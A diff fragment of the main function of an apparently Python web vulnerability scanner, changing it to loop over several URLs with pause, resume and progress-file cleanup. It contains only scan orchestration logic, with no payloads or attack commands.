-            categories=categories_to_use,
-            methods=args.methods,
-            parameters=args.params,
-            use_xss_combo=use_xss_combo
-        )
+    total_vulnerabilities = 0
     
-    # Generate report and save only vulnerable results
-    scanner.generate_report(results, vuln_count)
-    scanner.save_vulnerable_results(results)
+    for url in urls_to_scan:
+        vuln_count, was_paused = scanner.scan_website(
+            url, 
+            methods=args.methods,
+            parameters=args.params,
+            resume=args.resume
+        )
+        
+        total_vulnerabilities += vuln_count
+        
+        if was_paused:
+            break
+        
+        # Brief pause between URLs
+        if len(urls_to_scan) > 1:
+            time.sleep(1)
+    
+    # Save vulnerable results
+    if not scanner.pause_event.is_set():
+        scanner.save_vulnerable_results()
+        
+        # Clean up progress file if scan completed
+        if os.path.exists(scanner.progress_file):
+            os.remove(scanner.progress_file)
 
 if __name__ == "__main__":
-    # Disable SSL warnings for testing
     requests.packages.urllib3.disable_warnings()
     main()
